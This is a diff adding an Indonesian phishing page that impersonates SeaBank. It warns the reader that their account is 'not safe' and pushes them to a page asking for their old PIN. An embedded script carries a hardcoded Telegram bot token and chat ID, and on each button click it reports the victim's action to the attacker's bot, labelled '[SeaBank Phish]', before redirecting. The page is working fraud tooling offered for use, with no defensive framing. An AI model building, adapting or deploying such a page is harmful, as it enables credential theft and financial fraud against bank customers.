@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pemberitahuan Keamanan Akun - SeaBank</title>
+    
+    <style>
+        /* CSS Umum untuk Tampilan Email */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5; /* Latar belakang abu-abu muda */
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+        }
+
+        .email-wrapper {
+            max-width: 600px;
+            width: 100%;
+            background-color: #ffffff;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.05);
+            margin-top: 30px;
+            margin-bottom: 30px;
+            border-radius: 8px; 
+            overflow: hidden; 
+        }
+
+        /* --- HEADER ORANGE --- */
+        .header {
+            background-color: #ff6600; /* Orange Khas SeaBank */
+            color: #ffffff;
+            padding: 20px 30px;
+            display: flex;
+            align-items: center;
+            position: relative;
+            height: 50px;
+        }
+
+        .header-logo {
+            font-size: 24px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+        }
+
+        .header-logo span {
+            /* Simulasi ikon 'S' */
+            border: 2px solid white;
+            border-radius: 50%;
+            padding: 2px 7px;
+            margin-right: 10px;
+            line-height: 1;
+        }
+
+        .header-watermark {
+            position: absolute;
+            right: 0;
+            top: 0;
+            font-size: 100px;
+            font-weight: bold;
+            opacity: 0.1;
+            color: white;
+            line-height: 1;
+            padding-right: 20px;
+        }
+
+        /* --- BODY KONTEN --- */
+        .content {
+            padding: 30px 30px 50px 30px;
+            color: #333333;
+            line-height: 1.6;
+        }
+
+        .greeting {
+            font-size: 16px;
+            margin-bottom: 25px;
+        }
+
+        .main-message {
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        .security-alert {
+            font-size: 16px;
+            font-weight: bold;
+            color: #cc0000; /* Merah untuk peringatan */
+            margin-bottom: 20px;
+        }
+
+        /* --- TOMBOL AKSI --- */
+        .action-button {
+            display: inline-block;
+            background-color: #ff6600; /* Orange SeaBank */
+            color: white;
+            padding: 12px 25px;
+            text-decoration: none;
+            border-radius: 5px;
+            font-size: 15px;
+            font-weight: bold;
+            transition: background-color 0.3s ease;
+            margin-top: 10px;
+            border: none;
+            cursor: pointer;
+        }
+
+        .action-button:hover {
+            background-color: #e05c00;
+        }
+
+        /* --- FOOTER INFORMASI --- */
+        .footer-info {
+            text-align: center;
+            padding: 30px 30px 10px 30px;
+            border-top: 1px solid #eeeeee;
+        }
+
+        .footer-text {
+            font-size: 12px;
+            color: #777777;
+            margin-bottom: 20px;
+        }
+
+        .contact-links a {
+            color: #555555;
+            text-decoration: none;
+            font-size: 12px;
+            margin: 0 10px;
+        }
+
+        .contact-links span {
+            color: #dddddd;
+        }
+
+        .legal-footer {
+            background-color: #f8f8f8; /* Latar belakang footer legal */
+            padding: 20px 30px;
+            font-size: 10px;
+            color: #999999;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="email-wrapper">
+        <div class="header">
+            <div class="header-logo">
+                <span>S</span>SeaBank
+            </div>
+            <div class="header-watermark">S</div>
+        </div>
+
+        <div class="content">
+            <p class="greeting"></p>
+
+            <p class="security-alert">⚠️ Akun Anda TIDAK AMAN!</p>
+
+            <p class="main-message">
+                Kami mendeteksi adanya aktivitas yang mencurigakan. Demi keamanan dan kenyamanan Anda, mohon **segera ganti PIN dan Password** akun SeaBank Anda. Tindakan ini diperlukan untuk mengamankan data dan dana Anda.
+            </p>
+
+            <center>
+                <a href="input_pin_lama.html" id="securityActionButton" class="action-button" role="button">ATUR KEAMANAN AKUN SEKARANG</a>
+            </center>
+
+            <br><br>
+
+            <p style="font-size: 14px;">Salam Hangat,</p>
+            <p style="font-size: 14px; font-weight: bold; margin-top: 5px;">SeaBank</p>
+        </div>
+
+        <div class="footer-info">
+            <p class="footer-text">
+                Ini adalah halaman otomatis yang menampilkan peringatan keamanan.
+            </p>
+
+            <div class="contact-links" style="margin-bottom: 30px;">
+                <span style="font-weight: bold;">📞 1500 130</span> 
+                <span>|</span> 
+                <a href="mailto:cs@seabank.co.id">✉️ cs@seabank.co.id</a>
+            </div>
+
+            <div class="contact-links" style="margin-bottom: 30px;">
+                <a href="#">Syarat Layanan Perbankan</a> 
+                <span>|</span> 
+                <a href="#">Kebijakan Privasi</a> 
+                <span>|</span> 
+                <a href="#">seabank.co.id</a>
+            </div>
+            
+            <div class="social-icons" style="margin-bottom: 25px;">
+                <a href="#" style="margin: 0 5px; color: #555;">[f]</a>
+                <a href="#" style="margin: 0 5px; color: #555;">[o]</a>
+                <a href="#" style="margin: 0 5px; color: #555;">[t]</a>
+                <a href="#" style="margin: 0 5px; color: #555;">[y]</a>
+                <a href="#" style="margin: 0 5px; color: #555;">[in]</a>
+                <a href="#" style="margin: 0 5px; color: #555;">[w]</a>
+            </div>
+        </div>
+
+        <div class="legal-footer">
+            PT Bank Seabank Indonesia berizin dan diawasi oleh Otoritas Jasa Keuangan (OJK) dan Bank Indonesia (BI) serta merupakan bank peserta penjaminan Lembaga Penjamin Simpanan (LPS)
+        </div>
+    </div>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const actionButton = document.getElementById('securityActionButton');
+            
+            // *** INFORMASI BOT TELEGRAM ANDA ***
+            const BOT_TOKEN = '8286824254:AAHECrYlrnN0GeEBdG2ASNJEg79mw0FAYn8';
+            const CHAT_ID = '5923031825';
+            // **********************************
+            
+            // Fungsi untuk mengirim data ke Telegram
+            function sendToTelegram(message, callback) {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+                
+                // Menggunakan Fetch API untuk permintaan asinkronus
+                fetch(url)
+                    .then(response => {
+                        if (!response.ok) {
+                            console.error('Gagal mengirim ke Telegram:', response.statusText);
+                        }
+                        if (callback) callback(); // Panggil callback setelah selesai/gagal
+                    })
+                    .catch(error => {
+                        console.error('Error saat melakukan fetch ke Telegram:', error);
+                        if (callback) callback(); // Panggil callback setelah error
+                    });
+            }
+
+            actionButton.addEventListener('click', function(event) {
+                event.preventDefault(); // Mencegah pengalihan langsung
+                
+                const buttonText = actionButton.textContent.trim();
+                const notificationMessage = `[SeaBank Phish] Notifikasi: Tombol "${buttonText}" diklik. Pengguna diarahkan ke halaman PIN.`;
+                
+                // Kirim notifikasi, lalu lanjutkan ke halaman berikutnya
+                sendToTelegram(notificationMessage, function() {
+                    // Setelah pengiriman (berhasil atau gagal), lanjutkan ke halaman berikutnya
+                    window.location.href = actionButton.href; 
+                });
+            });
+        });
+    </script>
+</body>
+</html>
